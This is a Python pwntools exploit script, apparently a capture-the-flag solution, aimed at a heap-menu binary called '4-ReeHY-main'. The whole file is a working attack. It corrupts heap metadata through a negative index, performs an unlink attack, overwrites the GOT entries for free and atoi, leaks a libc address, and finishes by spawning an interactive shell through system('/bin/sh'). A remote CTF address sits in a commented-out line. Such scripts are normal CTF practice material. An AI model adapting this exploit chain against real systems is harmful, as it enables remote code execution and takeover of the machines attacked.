from pwn import *
context.log_level = 'debug'
p=process('./4-ReeHY-main')
#p=remote('111.200.241.244',50067)
libc = ELF('./ctflibc.so.6')
ReeHY = ELF('./4-ReeHY-main')
head_addr= 0x6020e0
FREE_GOT= ReeHY.got['free']
PUTS_GOT= ReeHY.got['puts']
ATOI_GOT= ReeHY.got['atoi']
def create(size,cun_number,content):
	p.sendlineafter('$ ','1')	
	p.recvuntil('Input size\n')
	p.sendline(str(size))
	p.recvuntil('Input cun\n')
	p.sendline(str(cun_number))
	p.recvuntil('Input content\n')
	p.sendline(content)

def delete(cun_number):
	p.sendlineafter('$ ','2')
	p.recvuntil('dele\n')
	p.sendline(str(cun_number))
	

def edit(cun_number,content):
	p.sendlineafter('$ ','3')
	p.recvuntil('edit\n')
	p.sendline(str(cun_number))
	p.recvuntil('content\n')
	p.send(content)  #send,not sendline , in order not to add '\n'

	
#gdb.attach(p)
p.recvuntil('$ ')
p.sendline('aaa')
create(0x30,0,'AAA')
create(0x80,1,'BBB')
create(0x10,2,'CCC')
delete(-2)
create(0x14,3,'DDD')
payload= p32(0x60)
edit(3,payload)
#edit chunk0
payload1= p64(0)+p64(0x20)+p64(head_addr-0x18)+p64(head_addr-0x10)
payload1+=p64(0x20)+ 'a'*8
#payload1.ljust(0x30,'\x00')
payload1+= p64(0x30)+ p64(0x90)
edit(0,payload1)
delete(1) #unlink

payload2= '\x00'*0x18+p64(FREE_GOT)+ p64(0x1)+ p64(0x6030a0)+p64(0x0)+p64(PUTS_GOT)+p64(0x1)+ p64(ATOI_GOT)
edit(0,payload2)

#change free@got to puts_plt
puts_PLT= ReeHY.plt['puts']
edit(0,p64(puts_PLT))
#show puts_addr
delete(2)
#print(p.recv())
puts_addr=p.recvuntil('\ndele').split('\ndele')[0].ljust(8,'\x00')
puts_addr=u64(puts_addr)
print('hh')

libc_base= puts_addr-libc.symbols['puts']
system_addr= libc_base+ libc.symbols['system']
binsh_addr= libc_base+ next(libc.search('/bin/sh'))

payload3= p64(system_addr)
#payload3= p64(puts_addr)
edit(3,payload3)

#trigger system('/bin/sh')
#p.sendlineafter('$ ',p64(binsh_addr))
p.sendlineafter('$ ','/bin/sh\x00')
p.interactive()
